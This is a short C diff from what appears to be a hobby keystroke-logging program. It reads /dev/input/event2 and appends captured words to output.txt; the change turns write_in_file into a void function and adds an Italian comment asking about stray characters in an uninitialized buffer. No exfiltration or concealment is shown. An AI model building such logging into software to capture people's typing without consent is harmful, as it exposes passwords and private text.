@@ -4,18 +4,19 @@
 #include <unistd.h>
 #include <linux/input.h>
 
+// perche' ai primi indici ( rispettivamente 0 - 3 ) se non viene messo niente prende dei caratterei a caso?
+
 #define INPUT_DEVICE "/dev/input/event2" // Use your input device
 #define MAX_WORD_SIZE 30
 
 
-int write_in_file(char word[MAX_WORD_SIZE])
+void write_in_file(char word[MAX_WORD_SIZE])
 {
 
 	FILE* file = fopen("output.txt", "a");
 	fprintf(file, "%s\n", word );
 	fclose(file);
-	
-	return 0;
+
 }
 
 
